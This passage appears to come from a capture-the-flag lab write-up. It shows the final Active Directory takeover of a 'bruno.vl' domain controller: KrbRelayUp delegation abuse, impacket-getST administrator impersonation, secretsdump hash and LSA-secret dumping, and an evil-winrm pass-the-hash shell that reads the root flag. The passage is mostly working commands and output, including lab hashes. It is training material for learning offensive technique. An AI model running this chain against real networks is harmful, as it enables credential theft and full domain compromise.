[+] S4U2proxy success!
[+] Importing ticket into a sacrificial process using CreateNetOnly
[+] Process         : 'C:\Users\svc_scan\Documents\KrbRelayUp.exe krbscm --ServiceName "KrbSCM"' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 348
[+] Ticket successfully imported!
[+] LUID            : 0x685960
[+] System service should be started in background
```
This has set up the RBCD

```python
impacket-getST -impersonate 'administrator' \
  -spn 'cifs/BRUNODC.bruno.vl' \
  -dc-ip 10.129.11.177 \
  'bruno.vl/KRBRELAYUP$:pK2=fZ5=yQ6@bK0@'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_BRUNODC.bruno.vl@BRUNO.VL.ccache
```

```python
export KRB5CCNAME=administrator@cifs_BRUNODC.bruno.vl@BRUNO.VL.ccache
```

```python
impacket-secretsdump -k -no-pass BRUNODC.bruno.vl
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf58ac639976f0c99c2dde0d24ef3219d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:850e9b2af4245da7880c3e57b3bd0dee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
BRUNO\BRUNODC$:plain_password_hex:bef8d31d0b159e05ce5dbf6141b7e94517fbbf80bb130fe3bb965f66cd97dbaccfeaec78eb985cda4ced51b1eb779676e217ee0f12fccecd9679a87653f5f5e0b94ce117fa8c63ee374efee6aa55ccc74124e758b6007aaef15964ed94e99cab7d4b32776f5b862e2baa6a6e0bb5db9fc72f49a5f9013e4968240d7f7a06755c1558f50c34874e71f988d83bade80c2dfa9a0d3e3cac38ee24a2e353375bbcb2c1540b0ac9245cda18ab6ffa9708438503dc038bebbf0959bab1942ad4306606c1cdb9e0e7465ea6b955c1bd7e5a03a6fea5dc4d70ee57a6d7b9b9aca8ea295aea61b6c077fa10ab63962836a6c336af
BRUNO\BRUNODC$:aad3b435b51404eeaad3b435b51404ee:4c1d8bc9a8067acf82233c7b6400234e:::
.........[SNIP]
```

```python
evil-winrm -i brunodc.bruno.vl -u charles.young -H '3d50f4c837cef7cf5143767553b6cc19'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Charles.Young\Documents> cd ../../Administrator/Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         3/29/2026   7:28 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
||9d0c79253a4dacdc57b0f976d44fff4c||
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
Domain admin!
